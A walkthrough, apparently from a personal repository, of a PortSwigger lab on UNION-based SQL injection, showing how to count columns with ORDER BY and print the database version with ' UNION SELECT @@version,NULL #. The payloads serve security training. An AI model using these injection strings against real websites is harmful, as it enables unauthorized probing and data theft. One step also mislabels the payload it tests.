# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.


---------------------------------------------

Source : https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

---------------------------------------------

## Brief Analysis

This lab demonstrates how input from URL parameters can be exploited to perform SQL injection, specifically the UNION-based injection type.
```sh
/filter?category=Pets
```
The category parameter value is entered directly into the SQL query without sanitization or parameterized queries. This allows attackers to inject additional SQL that is executed by the server.

## Solution Steps
#### 1. Click one of the categories
<img width="1445" height="514" alt="Image" src="https://github.com/user-attachments/assets/cd02f117-f62c-4712-b2c8-ea5f556524ae" />

#### 2. Identifying the number of columns
Although the website displays two columns (title and description), verification is necessary to confirm this.
<img width="1435" height="845" alt="Image" src="https://github.com/user-attachments/assets/c45bb22f-b8f1-46aa-bc89-295269456b96" />

To find out, use a command like this (use Burp Suite):
```sh
' ORDER BY 1--
```
<img width="745" height="403" alt="Image" src="https://github.com/user-attachments/assets/099f014f-cdf7-42e0-84b2-77b423ab1ec3" />

Press CTRL + U to convert it to a URL.
<img width="1481" height="378" alt="Image" src="https://github.com/user-attachments/assets/c26ee442-beb8-40fd-9f46-cdc5cf475e12" />

The response indicates that there is still an error. Try replacing the comment mark with `#` and see the result.
```sh
' ORDER BY 1#
```
<img width="1489" height="328" alt="Image" src="https://github.com/user-attachments/assets/7eb6da20-24a8-4ddc-84d0-43ecdbcab8ce" />

The command was successful because the response given was 200. Next, determine the number of columns by changing the number.
```sh
' ORDER BY <number>#
```

When using numbers 1 and 2, the server responds with 200. `' ORDER BY 1#` and `' ORDER BY 2#`
<img width="1493" height="308" alt="Image" src="https://github.com/user-attachments/assets/339553e9-a081-43b5-a353-2a1d6a6edd50" />

When using the number 3 `' ORDER BY 1#`, the response given is 500 with the description Interval Server Error.
<img width="1495" height="274" alt="Image" src="https://github.com/user-attachments/assets/9baca3ac-d1dd-45d6-9d16-059de8d63f3f" />

From this information, it can be confirmed that there are two columns. Next, check whether the input entered will be displayed on the website with a command like this:
```sh
' UNION SELECT 'hai','hello' #
```
<img width="1490" height="407" alt="Image" src="https://github.com/user-attachments/assets/8a85e493-7c99-41b2-b3d6-e31b4825c5ec" />
The results show that the server displays the input provided to the website display.

#### 3. Displaying the database version
To display the database version, use a command like this:
```sh
' UNION SELECT @@version,NULL #
```

#### 4. Chechk the results
If the command runs correctly, the website will display its database version information.
<img width="1488" height="226" alt="Image" src="https://github.com/user-attachments/assets/73cbc1ac-cc80-430b-ab4b-00bd56d17a25" />

<img width="1459" height="818" alt="Image" src="https://github.com/user-attachments/assets/687c226a-257e-4a03-906e-1de337ef0d21" />


---------------------------------------------

Reference : https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------
